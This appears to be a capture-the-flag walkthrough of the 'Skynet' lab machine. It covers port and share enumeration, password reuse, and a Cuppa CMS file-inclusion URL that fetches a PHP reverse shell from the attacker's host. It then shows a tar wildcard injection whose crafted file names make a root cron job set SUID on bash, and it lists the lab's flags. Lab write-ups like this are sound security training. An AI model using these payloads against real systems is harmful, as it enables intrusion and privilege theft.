# Box Name
## Skynet
---

## Overview
### A vulnerable Terminator themed Linux machine.
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```
Nmap 7.91 scan initiated Sat Mar 20 22:49:48 2021 as: nmap -vvv -p 22,80,110,143,139,445 -A -sV -oN nmap/initial 10.10.251.88
Nmap scan report for 10.10.251.88
Host is up, received syn-ack (0.21s latency).
Scanned at 2021-03-20 22:49:49 CDT for 21s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: UIDL RESP-CODES CAPA AUTH-RESP-CODE SASL TOP PIPELINING
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: LITERAL+ more have OK LOGIN-REFERRALS listed ID capabilities SASL-IR LOGINDISABLEDA0001 Pre-login post-login ENABLE IMAP4rev1 IDLE
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h35m53s, deviation: 2h53m12s, median: -4m07s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14856/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28868/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54298/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44577/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-03-20T22:45:55-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-21T03:45:55
|_  start_date: N/A


```

# ferox
```
ferox -u http://10.10.50.56 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php -C 403 -o logs/ferox.md  

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.50.56
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        9l       28w      310c http://10.10.50.56/admin
301        9l       28w      308c http://10.10.50.56/css
301        9l       28w      317c http://10.10.50.56/squirrelmail
301        9l       28w      311c http://10.10.50.56/config
301        9l       28w      307c http://10.10.50.56/js


```
# smbmap
```
smbmap -H 10.10.50.56                               
[+] Guest session   	IP: 10.10.50.56:445	Name: 10.10.50.56                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```

# smbclient
```
smbclient \\\\10.10.50.56\\anonymous                
Enter WORKGROUP\scott's password: 
Try "help" to get a list of possible commands.
smb: \> ls *
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 07:20:17 2019
  attention.txt                       N      163  Wed Sep 18 03:04:59 2019
  logs                                D        0  Wed Sep 18 04:42:16 2019

		9204224 blocks of size 1024. 5831532 blocks available

```
 - ## downloaded attention.txt
 ```
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

 ```
 - ## downloaded  logs\log1.txt
	 ```
	 cyborg007haloterminator
	terminator22596
	terminator219
	terminator20
	terminator1989
	terminator1988
	terminator168
	terminator16
	terminator143
	terminator13
	terminator123!@#
	terminator1056
	terminator101
	terminator10
	terminator02
	terminator00
	roboterminator
	pongterminator
	manasturcaluterminator
	exterminator95
	exterminator200
	dterminator
	djxterminator
	dexterminator
	determinator
	cyborg007haloterminator
	avsterminator
	alonsoterminator
	Walterminator
	79terminator6
	1996terminator
	 ```
	- ### possible list of passwords?

- # using the first password in log1.txt was able to log int miles squirrelmail account
- ![[Pasted image 20220311113633.png]]

	- ### Samba Password Reset
- ![[Pasted image 20220311113802.png]]

# log into miles Samba share
```
smbclient \\\\10.10.50.56\\milesdyson -U milesdyson                       
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> ls *
  .                                   D        0  Tue Sep 17 09:05:47 2019
  ..                                  D        0  Wed Sep 18 03:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019
  notes                               D        0  Tue Sep 17 09:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019

		9204224 blocks of size 1024. 5792004 blocks available
smb: \> 
```

## checking out the notes dir
```
smb: \notes\> ls *
  .                                   D        0  Tue Sep 17 09:18:40 2019
  ..                                  D        0  Tue Sep 17 09:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 09:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 09:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 09:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 09:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 09:01:29 2019
  important.txt                       N      117  Tue Sep 17 09:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 09:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 09:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 09:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 09:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 09:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 09:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 09:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 09:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 09:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 09:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 09:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 09:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 09:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 09:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 09:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 09:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 09:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 09:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 09:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 09:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 09:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 09:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 09:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 09:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 09:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 09:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 09:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 09:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 09:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 09:01:29 2019
  1.00 Foundations.md

```

- ## we find a bunch of .md files and a important.txt file
	```bash
	cat important.txt 
	
	1. Add features to beta CMS /45kra24zxs28v3yd
	2. Work on T-800 Model 101 blueprints
	3. Spend more time with my wife
	
	```
	- ## we find an URL to a CMS
	- ## run a gobuster scan on url find an administrator page
	```
	gobuster dir -u http://10.10.50.56/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -a C -t 100 -o logs/gobuster.md 
	===============================================================
	Gobuster v3.0.1
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://10.10.50.56/45kra24zxs28v3yd
	[+] Threads:        100
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     C
	[+] Extensions:     php,txt,html
	[+] Timeout:        10s
	===============================================================
	2022/03/11 11:47:00 Starting gobuster
	===============================================================
	/index.html (Status: 200)
	/administrator (Status: 301)
	
	```
	- ### find a Cuppa login page at /45kra24zxs28v3yd/administrator
	- ![[Pasted image 20220311115409.png]]

# searchsploit
- ## using searchspoit find a LFI/rce text file
	```
	searchsploit cuppa                  
	----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                                                                           |  Path
	----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
	Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                          | php/webapps/25971.txt
	----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
	
	```
	- ## from this text file use lfi to get [[revshell]]
	-  ##  http://10.10.241.146/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.0.199:8000/php-reverse-shell.php
	- ![[Pasted image 20230130162226.png]]
## Initial Foothold


---
# cuppa cms lfi/rce


# on the box
- ## once on the box used password reuse for milesdyson user ((squirllemail password))
	- #### milesdyson:cyborg007haloterminator
	```
	www-data@skynet:/home$ ls -la
	total 12
	drwxr-xr-x  3 root       root       4096 Sep 17  2019 .
	drwxr-xr-x 23 root       root       4096 Sep 18  2019 ..
	drwxr-xr-x  5 milesdyson milesdyson 4096 Sep 17  2019 milesdyson
	www-data@skynet:/home$ su milesdyson
	Password: 
	milesdyson@skynet:/home$
	
	```


# digging around in miles home dir find some files owned by root

```bash
milesdyson@skynet:~$ ls -la backups/
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Mar 11 12:05 backup.tgz

```
- ### cat backup.sh
	```bash
	
	#!/bin/bash
	cd /var/www/html
	tar cf /home/milesdyson/backups/backup.tgz *
	
	```
	- ### using tar with the * wildcard
	
- ### check for cron jobs
```bash
milesdyson@skynet:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
---
## Privilege Escalation
# abuse cron job
- ### per the backup.sh cd to /var/www/html
	- ### create these 3 files
```bash
echo "chmod u+s /bin/bash" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
```

- ### wait a few minuets and
```bash
www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3#
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.3# 
```
# cat user.txt
```bash
bash-4.3# /var/www/html$ cat /home/milesdyson/user.txt 
7ce5c2109a40f958099283600a9ae807

```
# cat root.txt
```bash
bash-4.3# /var/www/html$ sudo cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```

---
